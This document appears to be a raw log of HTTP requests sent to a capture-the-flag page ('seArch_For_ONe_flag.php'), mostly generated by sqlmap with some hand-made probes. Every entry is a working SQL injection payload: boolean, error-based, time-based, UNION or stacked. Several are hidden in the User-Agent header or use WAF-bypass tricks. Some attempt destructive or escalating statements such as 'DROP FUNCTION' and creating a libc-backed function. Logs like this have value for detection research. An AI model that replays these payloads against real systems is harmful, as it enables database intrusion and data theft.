"/seArch_For_ONe_flag.php?userid=1%27%29%20AND%207975%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287975%3D7975%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27oJmQ%27%3D%27oJmQ HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7178786a71,(SELECT (ELT(9064=9064,1))),0x71626a6271)) USING utf8))) AND ('eryk' LIKE 'eryk
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%27%20IN%20BOOLEAN%20MODE%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29vyVo%29%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x67746b69%29%29%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%df%27or(1)--/**/+&password=admin%22 HTTP/1.1
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org));IF(8042=2581) SELECT 8042 ELSE DROP FUNCTION NCUO--
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)' OR (SELECT 8410 FROM(SELECT COUNT(*),CONCAT(0x7178786a71,(SELECT (ELT(8410=8410,1))),0x71626a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) OR 'UHwS'='oHmx
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)' AND 1288=CAST((CHR(113)||CHR(112)||CHR(122)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1288=1288) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC) AND 'UqOA'='UqOA
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=4/**/or/**/flag HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?userid=admin%27%29%29%29%3BSELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%20AND%20%28%28%28%27ANtB%27%3D%27ANtB HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%00%27%29%29%29%20AND%20EXTRACTVALUE%288234%2CCONCAT%280x5c%2C0x7176627171%2C%28SELECT%20%28ELT%288234%3D8234%2C1%29%29%29%2C0x716a707a71%29%29%20AND%20%28%28%28%27nkIb%27%3D%27nkIb HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=0004%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.1.6#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)""))) AND UPDATEXML(2052,CONCAT(0x2e,0x7178786a71,(SELECT (ELT(2052=2052,1))),0x71626a6271),5617) AND (((""KNYk"" LIKE ""KNYk
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%60%29%20WHERE%203717%3D3717%20AND%20UPDATEXML%286918%2CCONCAT%280x2e%2C0x7176627171%2C%28SELECT%20%28ELT%286918%3D6918%2C1%29%29%29%2C0x716a707a71%29%2C1735%29--%20 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=0004%20AND%209570%3D%28SELECT%209570%20FROM%20PG_SLEEP%285%29%29--%20CfEa HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.1.6#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=-9756%27%29%0aAS%0aKPhM%0aWHERE%0a1361%3D1361%0aOR%0a2733%0aBETWEEN%0a2733%0aAND%0a2733%23&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20AND%20EXP%28%7E%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176627171%2C%28SELECT%20%28ELT%285688%3D5688%2C1%29%29%29%2C0x716a707a71%2C0x78%29%29x%29%29 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%29%29%20AS%20ugMd%20WHERE%207420%3D7420%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282055%3D7996%29%20THEN%201%20ELSE%200x28%20END%29%29--%20 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1//or//1//=//1%29%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FAaen HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29VVGv%29%23 HTTP/1.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store

"
"/seArch_For_ONe_flag.php?userid=admin%27%29%29%20AS%20AnnQ%20WHERE%208558%3D8558%20AND%20EXP%28%7E%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7178767671%2C%28SELECT%20%28ELT%285911%3D5911%2C1%29%29%29%2C0x717a766b71%2C0x78%29%29x%29%29--%20fjBx HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%22%20WHERE%201893%3D1893%20OR%20EXP%28%7E%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7178767671%2C%28SELECT%20%28ELT%284293%3D4293%2C1%29%29%29%2C0x717a766b71%2C0x78%29%29x%29%29--%20Mkzf HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?1&userid=%22%20AND%208009%3DCONCAT%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%288009%3D8009%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%29%20AND%20%22lFiy%22%20LIKE%20%22lFiy HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20UNION%09ALL%09SELECT%09NULL%09%2CNULL%09%2CNULL%09%2CNULL%09%2CNULL%09%2CNULL%09%2CNULL%09%2CNULL%09--%20mLYd HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.11.19#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%22%20WHERE%204197%3D4197%20AND%20MAKE_SET%287320%3D7320%2C8907%29--%20 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%a0%22%0aWHERE%0a6544%3D6544%3BSELECT%0a%28CASE%0aWHEN%0a%285749%3D3201%29%0aTHEN%0a5749%0aELSE%0a5749%2A%28SELECT%0a5749%0aFROM%0aINFORMATION_SCHEMA.PLUGINS%29%0aEND%29%23&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%27%29%29%20AS%20cAzZ%20WHERE%208509%3D8509%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7178767671%2C%28SELECT%20%28ELT%281721%3D1721%2C1%29%29%29%2C0x717a766b71%29%29%20USING%20utf8%29%29%29--%20iWAQ HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: -2683"" WHERE 8440=8440 OR 4265=9427-- HMlg
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%22%20WHERE%201678%3D1678%20AND%20%28SELECT%209473%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178767671%2C%28SELECT%20%28ELT%289473%3D9473%2C1%29%29%29%2C0x717a766b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20wbzS HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%a0%29%0aWHERE%0a1890%3D1890%3BSELECT%0a%28CASE%0aWHEN%0a%287261%3D7261%29%0aTHEN%0a7261%0aELSE%0a1%2F%28SELECT%0a0%29%0aEND%29--&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store

"
"/seArch_For_ONe_flag.php?userid=-7618%27%20UNION%20ALL%20SELECT%205899%2C5899%2C5899%2C5899%2C5899%2C5899--%20aGBm HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=13&password=1%27%29%29%29%20RLIKE%20SLEEP%285%29%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store

"
"/seArch_For_ONe_flag.php?userid=1%a0%27%7C%7C%28SELECT%0a%27whHl%27%0aWHERE%0a2522%3D2522%3BSELECT%0a%2A%0aFROM%0aGENERATE_SERIES%288961%2C8961%2CCASE%0aWHEN%0a%288961%3D5012%29%0aTHEN%0a1%0aELSE%0a0%0aEND%29%0aLIMIT%0a1--&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%20AND%20EXTRACTVALUE%288204%2CCONCAT%280x5c%2C0x7178767671%2C%28SELECT%20%28ELT%288204%3D8204%2C1%29%29%29%2C0x717a766b71%29%29 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%df%27or%271%27=%271&password=admin HTTP/1.1
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=1%a0%27%29%29%3BIF%283912%3D3912%29%0aSELECT%0a3912%0aELSE%0aDROP%0aFUNCTION%0aTSPt--&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-5513%22%29%29%20UNION%20ALL%20SELECT%206269%2C6269%2C6269%2C6269%2C6269%2C6269--%20hKgk HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)
Cache-Control: no-cache

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)"" OR ROW(3576,3741)>(SELECT COUNT(*),CONCAT(0x7178786a71,(SELECT (ELT(3576=3576,1))),0x71626a6271,FLOOR(RAND(0)*2))x FROM (SELECT 4523 UNION SELECT 9656 UNION SELECT 2941 UNION SELECT 1613)a GROUP BY x)-- zGgd
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1^case/**/when/**/1=0/**/then/**/1/**/else/**/0/**/end^0; HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%27%20OR%20EXTRACTVALUE%281685%2CCONCAT%280x5c%2C0x717a787071%2C%28SELECT%20%28ELT%281685%3D1685%2C1%29%29%29%2C0x7171766271%29%29--%20OCDw&password=123 HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=-8449%29%20AS%20tHFA%20WHERE%207143%3D7143%20UNION%20ALL%20SELECT%207143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143%2C7143--%20XTxF HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.1#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)');SELECT SLEEP(5) AND ('OSPk'='OSPk
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org));(SELECT * FROM (SELECT(SLEEP(5)))NmGZ)#
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=admin%df%27or(1)--/**/+&password=admin%27%20or%20%20sleep(5)%23 HTTP/1.1
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)');CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep(5)--
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1||1/**/order/**/by/**/asc HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)""));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(85)||CHR(66)||CHR(100),5) FROM DUAL--
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%29%29%29%20OR%20ROW%288115%2C7238%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a787071%2C%28SELECT%20%28ELT%288115%3D8115%2C1%29%29%29%2C0x7171766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%207223%20UNION%20SELECT%202689%20UNION%20SELECT%206121%20UNION%20SELECT%206293%29a%20GROUP%20BY%20x%29%20AND%20%28%28%289444%3D9444&password=123 HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/1=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/* ;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%20OR%20ROW%288115%2C7238%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a787071%2C%28SELECT%20%28ELT%288115%3D8115%2C1%29%29%29%2C0x7171766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%207223%20UNION%20SELECT%202689%20UNION%20SELECT%206121%20UNION%20SELECT%206293%29a%20GROUP%20BY%20x%29&password=123 HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%25%27%29%20AND%209068%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289068%3D9068%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27%25%27%3D%27 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)) RLIKE SLEEP(5) AND (8379=8379
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=4/**/or/**/65953 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?userid=13&password=1%22%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20eRTi HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20AS%20wBag%20WHERE%205065%3D5065%20AND%209068%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289068%3D9068%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20 HTTP/1.1
